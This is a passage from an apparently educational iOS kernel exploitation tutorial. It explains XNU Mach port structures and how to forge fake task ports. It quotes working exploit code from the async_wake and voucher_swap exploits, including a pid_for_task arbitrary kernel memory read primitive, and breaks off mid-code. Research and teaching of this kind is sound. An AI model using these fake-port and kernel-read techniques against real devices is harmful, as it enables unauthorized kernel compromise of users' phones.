<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_object</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">124</span><span class="o">:</span> <span class="cm">/*
    125:  *	IPC steals the high-order bits from the kotype to use
    126:  *	for its own purposes.  This allows IPC to record facts
    127:  *	about ports that aren't otherwise obvious from the
    128:  *	existing port fields.  In particular, IPC can optionally
    129:  *	mark a port for no more senders detection.  Any change
    130:  *	to IO_BITS_PORT_INFO must be coordinated with bitfield
    131:  *	definitions in ipc_port.h.
    132:  */</span>
    <span class="mi">133</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IO_BITS_PORT_INFO</span>	<span class="mh">0x0000f000</span>	<span class="cm">/* stupid port tricks */</span>
    <span class="mi">134</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IO_BITS_KOTYPE</span>		<span class="mh">0x00000fff</span>	<span class="cm">/* used by the object */</span>
    <span class="mi">135</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IO_BITS_OTYPE</span>		<span class="mh">0x7fff0000</span>	<span class="cm">/* determines a zone */</span>
    <span class="mi">136</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IO_BITS_ACTIVE</span>		<span class="mh">0x80000000</span>	<span class="cm">/* is object alive? */</span>
    <span class="mi">137</span><span class="o">:</span> 
    <span class="mi">138</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_active</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>		<span class="p">(((</span><span class="n">io</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">&amp;</span> <span class="n">IO_BITS_ACTIVE</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="mi">139</span><span class="o">:</span> 
    <span class="mi">140</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_otype</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>		<span class="p">(((</span><span class="n">io</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">&amp;</span> <span class="n">IO_BITS_OTYPE</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>
    <span class="mi">141</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_kotype</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>		<span class="p">((</span><span class="n">io</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">&amp;</span> <span class="n">IO_BITS_KOTYPE</span><span class="p">)</span>
    <span class="mi">142</span><span class="o">:</span> 
    <span class="mi">143</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">io_makebits</span><span class="p">(</span><span class="n">active</span><span class="p">,</span> <span class="n">otype</span><span class="p">,</span> <span class="n">kotype</span><span class="p">)</span>	\
    <span class="mi">144</span><span class="o">:</span> 	<span class="p">(((</span><span class="n">active</span><span class="p">)</span> <span class="o">?</span> <span class="n">IO_BITS_ACTIVE</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">otype</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">kotype</span><span class="p">))</span>
    <span class="mi">145</span><span class="o">:</span> 
    <span class="mi">146</span><span class="o">:</span> <span class="cm">/*
    147:  * Object types: ports, port sets, kernel-loaded ports
    148:  */</span>
    <span class="mi">149</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IOT_PORT</span>		<span class="mi">0</span>
    <span class="mi">150</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IOT_PORT_SET</span>		<span class="mi">1</span>
    <span class="mi">151</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IOT_NUMBER</span>		<span class="mi">2</span>		<span class="cm">/* number of types used */</span>
    <span class="mi">152</span><span class="o">:</span> </code></pre></figure>

<p>The <strong>IO_BITS_ACTIVE</strong> needs to be set to make sure the object is alive. The <strong>IO_BITS_OTYPE</strong> specifies the object type. The <strong>IO_BITS_KOTYPE</strong> field that determines what kind of port it is, whether it is a task port, or a clock port etc. While creating a fake port, you need to specify these values in the <strong>io_bits</strong> field. A full list can be found under <strong>osfmk/kern/ipc_kobject.h</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_kobject</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">091</span><span class="o">:</span> 
    <span class="mi">092</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_NONE</span>				<span class="mi">0</span>
    <span class="mi">093</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_THREAD</span>				<span class="mi">1</span>
    <span class="mi">094</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_TASK</span>				<span class="mi">2</span>
    <span class="mi">095</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_HOST</span>				<span class="mi">3</span>
    <span class="mi">096</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_HOST_PRIV</span>			<span class="mi">4</span>
    <span class="mi">097</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PROCESSOR</span>			<span class="mi">5</span>
    <span class="mi">098</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PSET</span>				<span class="mi">6</span>
    <span class="mi">099</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PSET_NAME</span>			<span class="mi">7</span>
    <span class="mi">100</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_TIMER</span>				<span class="mi">8</span>
    <span class="mi">101</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PAGING_REQUEST</span>		<span class="mi">9</span>
    <span class="mi">102</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_MIG</span>				<span class="mi">10</span>
    <span class="mi">103</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_MEMORY_OBJECT</span>		<span class="mi">11</span>
    <span class="mi">104</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_XMM_PAGER</span>			<span class="mi">12</span>
    <span class="mi">105</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_XMM_KERNEL</span>			<span class="mi">13</span>
    <span class="mi">106</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_XMM_REPLY</span>			<span class="mi">14</span>
    <span class="mi">107</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UND_REPLY</span>			<span class="mi">15</span>
    <span class="mi">108</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_HOST_NOTIFY</span>		<span class="mi">16</span>
    <span class="mi">109</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_HOST_SECURITY</span>		<span class="mi">17</span>
    <span class="mi">110</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_LEDGER</span>				<span class="mi">18</span>
    <span class="mi">111</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_MASTER_DEVICE</span>		<span class="mi">19</span>
    <span class="mi">112</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_TASK_NAME</span>			<span class="mi">20</span>
    <span class="mi">113</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_SUBSYSTEM</span>			<span class="mi">21</span>
    <span class="mi">114</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IO_DONE_QUEUE</span>		<span class="mi">22</span>
    <span class="mi">115</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_SEMAPHORE</span>			<span class="mi">23</span>
    <span class="mi">116</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_LOCK_SET</span>			<span class="mi">24</span>
    <span class="mi">117</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_CLOCK</span>				<span class="mi">25</span>
    <span class="mi">118</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_CLOCK_CTRL</span>			<span class="mi">26</span>
    <span class="mi">119</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IOKIT_IDENT</span>		<span class="mi">27</span>
    <span class="mi">120</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_NAMED_ENTRY</span>		<span class="mi">28</span>
    <span class="mi">121</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IOKIT_CONNECT</span>		<span class="mi">29</span>
    <span class="mi">122</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IOKIT_OBJECT</span>		<span class="mi">30</span>
    <span class="mi">123</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UPL</span>				<span class="mi">31</span>
    <span class="mi">124</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_MEM_OBJ_CONTROL</span>		<span class="mi">32</span>
    <span class="mi">125</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_AU_SESSIONPORT</span>		<span class="mi">33</span>
    <span class="mi">126</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_FILEPORT</span>			<span class="mi">34</span>
    <span class="mi">127</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_LABELH</span>			<span class="mi">35</span>
    <span class="mi">128</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_TASK_RESUME</span>		<span class="mi">36</span>
    <span class="mi">129</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_VOUCHER</span>			<span class="mi">37</span>
    <span class="mi">130</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_VOUCHER_ATTR_CONTROL</span>	<span class="mi">38</span>
    <span class="mi">131</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_WORK_INTERVAL</span>              <span class="mi">39</span>
    <span class="mi">132</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UX_HANDLER</span>                 <span class="mi">40</span>
    <span class="mi">133</span><span class="o">:</span> 
    <span class="mi">134</span><span class="o">:</span> <span class="cm">/*
    135:  * Add new entries here and adjust IKOT_UNKNOWN.
    136:  * Please keep ipc/ipc_object.c:ikot_print_array up to date.
    137:  */</span>
    <span class="mi">138</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UNKNOWN</span>                    <span class="mi">41</span>      <span class="cm">/* magic catchall       */</span>
    <span class="mi">139</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_MAX_TYPE</span>	<span class="p">(</span><span class="n">IKOT_UNKNOWN</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>	<span class="cm">/* # of IKOT_ types	*/</span>
    <span class="mi">140</span><span class="o">:</span> 
    <span class="mi">141</span><span class="o">:</span> 
    <span class="mi">142</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">is_ipc_kobject</span><span class="p">(</span><span class="n">ikot</span><span class="p">)</span>	<span class="p">((</span><span class="n">ikot</span><span class="p">)</span> <span class="o">!=</span> <span class="n">IKOT_NONE</span><span class="p">)</span>
    <span class="mi">143</span><span class="o">:</span> </code></pre></figure>

<p>Setting the <strong>io_bits</strong> field of the ports would look as simple as this.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#define IO_BITS_ACTIVE 0x80000000
</span>    <span class="cp">#define	IKOT_TASK 2
</span>    <span class="cp">#define IKOT_CLOCK 25
</span>
    <span class="n">fakeport</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">=</span> <span class="n">IO_BITS_ACTIVE</span> <span class="o">|</span> <span class="n">IKOT_CLOCK</span><span class="p">;</span>
    <span class="n">secondfakeport</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">=</span> <span class="n">IKOT_TASK</span><span class="o">|</span><span class="n">IO_BITS_ACTIVE</span><span class="p">;</span></code></pre></figure>

<p>The <strong>io_references</strong> field of the <strong>ipc_object</strong> would also need to be set to anything other than 0, just to make sure the object isn’t deallocated.</p>

<p>Coming back to the port structure, one of the other important fields is the <strong>struct ipc_space *receiver</strong> field which points to the <strong>ipc_space</strong> struct. The <strong>ipc_space</strong> structure for a task defines its IPC abilities. Each IPC capability is represented by an <strong>ipc_entry</strong> and put in a table, which is pointed to by the <strong>is_table</strong> field in the <strong>ipc_space</strong> struct. The port rights or capablities in the <strong>is_table</strong> are 16 bits and have a name which is actually an index onto the <strong>is_table</strong>. It is important to note that within the kernel, port rights (<strong>mach_port_t</strong>) are represented by passing a pointer to the appropriate port data structure (<strong>ipc_port_t</strong>).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_space</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">114</span><span class="o">:</span> 
    <span class="mi">115</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_space</span> <span class="p">{</span>
    <span class="mi">116</span><span class="o">:</span> 	<span class="n">lck_spin_t</span>	<span class="n">is_lock_data</span><span class="p">;</span>
    <span class="mi">117</span><span class="o">:</span> 	<span class="n">ipc_space_refs_t</span> <span class="n">is_bits</span><span class="p">;</span>	<span class="cm">/* holds refs, active, growing */</span>
    <span class="mi">118</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_table_size</span><span class="p">;</span>	<span class="cm">/* current size of table */</span>
    <span class="mi">119</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_table_free</span><span class="p">;</span>	<span class="cm">/* count of free elements */</span>
    <span class="mi">120</span><span class="o">:</span> 	<span class="n">ipc_entry_t</span> <span class="n">is_table</span><span class="p">;</span>		<span class="cm">/* an array of entries */</span>
    <span class="mi">121</span><span class="o">:</span> 	<span class="n">task_t</span> <span class="n">is_task</span><span class="p">;</span>                 <span class="cm">/* associated task */</span>
    <span class="mi">122</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_table_size</span> <span class="o">*</span><span class="n">is_table_next</span><span class="p">;</span> <span class="cm">/* info for larger table */</span>
    <span class="mi">123</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_low_mod</span><span class="p">;</span>	<span class="cm">/* lowest modified entry during growth */</span>
    <span class="mi">124</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_high_mod</span><span class="p">;</span>	<span class="cm">/* highest modified entry during growth */</span>
    <span class="mi">125</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">bool_gen</span> <span class="n">bool_gen</span><span class="p">;</span>       <span class="cm">/* state for boolean RNG */</span>
    <span class="mi">126</span><span class="o">:</span> 	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">is_entropy</span><span class="p">[</span><span class="n">IS_ENTROPY_CNT</span><span class="p">];</span> <span class="cm">/* pool of entropy taken from RNG */</span>
    <span class="mi">127</span><span class="o">:</span> 	<span class="kt">int</span> <span class="n">is_node_id</span><span class="p">;</span>			<span class="cm">/* HOST_LOCAL_NODE, or remote node if proxy space */</span>
    <span class="mi">128</span><span class="o">:</span> <span class="p">};</span>
    <span class="mi">129</span><span class="o">:</span> </code></pre></figure>

<p>The IPC space is a very important struct, and hence most exploits look for the kernel <strong>ipc_space</strong> in order to get a proper (yet fake) kernel task port. The trick has been to copy the <strong>ipc_space_kernel</strong> to a new memory and make your fake port’s <strong>receiver</strong> field point to it.</p>

<p>The <strong>kobject</strong> field points to different data structures depending on the <strong>kobject</strong> type set in the <strong>io_bits</strong> field. Hence if you are faking a task port, you need to point the <strong>kobject</strong> field to a <strong>struct task</strong>, and in case of a clock, a <strong>struct clock</strong>.</p>

<p>That’s it, so you need to fake the port until you make it :). Here is an example of creating a fake port from the async_wake exploit.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="kt">uint8_t</span><span class="o">*</span> <span class="nf">build_message_payload</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">dangling_port_address</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">message_body_size</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">message_body_offset</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">vm_map</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">receiver</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="o">**</span> <span class="n">context_ptr</span><span class="p">)</span> <span class="p">{</span>
      <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">body</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">message_body_size</span><span class="p">);</span>
      <span class="n">memset</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">message_body_size</span><span class="p">);</span>

      <span class="kt">uint32_t</span> <span class="n">port_page_offset</span> <span class="o">=</span> <span class="n">dangling_port_address</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">;</span>

      <span class="c1">// structure required for the first fake port:</span>
      <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">fake_port</span> <span class="o">=</span> <span class="n">body</span> <span class="o">+</span> <span class="p">(</span><span class="n">port_page_offset</span> <span class="o">-</span> <span class="n">message_body_offset</span><span class="p">);</span>

      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IO_BITS</span><span class="p">))</span> <span class="o">=</span> <span class="n">IO_BITS_ACTIVE</span> <span class="o">|</span> <span class="n">IKOT_TASK</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xf00d</span><span class="p">;</span> <span class="c1">// leak references</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xf00d</span><span class="p">;</span> <span class="c1">// leak srights</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER</span><span class="p">))</span> <span class="o">=</span> <span class="n">receiver</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0x123456789abcdef</span><span class="p">;</span>

      <span class="o">*</span><span class="n">context_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT</span><span class="p">));</span>

      <span class="c1">// set the kobject pointer such that task-&gt;bsd_info reads from ip_context:</span>
      <span class="kt">int</span> <span class="n">fake_task_offset</span> <span class="o">=</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT</span><span class="p">)</span> <span class="o">-</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_BSD_INFO</span><span class="p">);</span>

      <span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">dangling_port_address</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT</span><span class="p">))</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>

      <span class="c1">// when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task</span>
      <span class="c1">// pointer up there it's actually all in the buffer so we can also set the reference count to leak it, let's double check that!</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">fake_port</span> <span class="o">+</span> <span class="n">fake_task_offset</span> <span class="o">&lt;</span> <span class="n">body</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"the maths is wrong somewhere, fake task doesn't fit in message</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">fake_task</span> <span class="o">=</span> <span class="n">fake_port</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>

      <span class="c1">// set the ref_count field of the fake task:</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_REF_COUNT</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xd00d</span><span class="p">;</span> <span class="c1">// leak references</span>

      <span class="c1">// make sure the task is active</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_ACTIVE</span><span class="p">))</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

      <span class="c1">// set the vm_map of the fake task:</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_VM_MAP</span><span class="p">))</span> <span class="o">=</span> <span class="n">vm_map</span><span class="p">;</span>

      <span class="c1">// set the task lock type of the fake task's lock:</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0x22</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">body</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>For more details, i highly recommend checking out the this talk from CanSecWest <a href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">here</a>.</p>

<h2 id="pid_for_task-arbitrary-read-technique">pid_for_task() arbitrary read technique</h2>

<p>As discussed earlier, the <strong>pid_for_task</strong> Mach Trap will give out the <strong>PID</strong> of the corresponding task. It looks up the <strong>bsd_info</strong> field in the task struct which points to the corresponding BSD <strong>proc</strong> struct in the kernel, and reads the <strong>p_pid</strong> value. Assuming the <strong>p_pid</strong> field is at an offset of 0x10, and let’s say the address you want to read is <strong>addr</strong>, you can create a fake port, which then links to a fake task such that the <strong>bsd_info</strong> field in the task is <strong>addr - 0x10</strong>.</p>

<p>The following code from the voucher_swap exploit tries to do just that.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * stage1_read32
     *
     * Description:
     * 	Read a 32-bit value from kernel memory using our fake port.
     *
     * 	This primitive requires that we know the address of the pipe buffer containing our port.
     */</span>
    <span class="k">static</span> <span class="kt">uint32_t</span>
    <span class="nf">stage1_read32</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Do a read to make the pipe available for a write.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="c1">// Create our fake task. The task's proc's p_pid field overlaps with the address we want to</span>
    	<span class="c1">// read.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_proc_address</span> <span class="o">=</span> <span class="n">address</span> <span class="o">-</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">pipe_buffer_address</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_task</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">ref_count</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">bsd_info</span><span class="p">,</span>  <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_proc_address</span><span class="p">;</span>
    	<span class="c1">// Initialize the port as a fake task port pointing to our fake task.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_port_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_port_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>
    	<span class="c1">// Write our buffer to kernel memory.</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// Now use pid_for_task() to read our value.</span>
    	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">pid_for_task</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not read kernel memory in stage %d using %s"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="n">pid</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>Just combine the method twice and you can now read 64 bits at a time.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * stage1_read64
     *
     * Description:
